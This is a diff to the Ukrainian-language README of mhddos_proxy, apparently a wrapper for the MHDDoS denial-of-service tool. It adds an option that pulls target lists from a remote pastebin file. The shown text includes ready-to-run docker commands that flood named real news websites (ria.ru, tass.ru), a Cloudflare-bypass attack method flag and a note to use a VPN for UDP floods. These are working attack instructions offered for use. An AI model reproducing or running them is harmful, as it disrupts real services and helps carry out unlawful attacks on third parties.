@@ -78,6 +78,10 @@ UDP - **ТУТ ПОТРІБНО ВКЛЮЧИТИ VPN**
 
     docker run -it --rm portholeascend/mhddos_proxy -p 600 https://ria.ru https://tass.ru
 
+Цілі з віддаленого файла конфігурації - `-c https://pastebin.com/raw/95D1jjzy`
+
+    docker run -it --rm portholeascend/mhddos_proxy -c https://pastebin.com/raw/95D1jjzy
+
 Обрати метод(и) для HTTP(S) атаки (наприклад для обходу Cloudflare) - `--http-methods CFB`  
 **Цей параметр тільки в кінці** команди  
 Повний список [див. тут](https://github.com/MHProDev/MHDDoS#features-and-methods)
@@ -100,6 +104,7 @@ UDP - **ТУТ ПОТРІБНО ВКЛЮЧИТИ VPN**
     
     optional arguments:
       -h, --help             show this help message and exit
+      -c, --config URL       URL to a config file (list of targets in plain text)
       -t, --threads 300      Threads per CPU core (default is 300)
       -p, --period 300       How often to update the proxies (default is 300)
       --proxy-timeout 2      How many seconds to wait for the proxy to make a connection.
@@ -170,6 +175,7 @@ Wrapper script for running [MHDDoS](https://github.com/MHProDev/MHDDoS)
     optional arguments:
       -h, --help             show this help message and exit
       -t, --threads 300      Threads per CPU Core (default is 300)
+      -c, --config URL       URL to a config file (list of targets in plain text)
       -p, --period 300       How often to update the proxies (default is 300)
       --proxy-timeout 2      How many seconds to wait for the proxy to make a connection.
                              Higher values give more proxies, but with lower speed/quality.
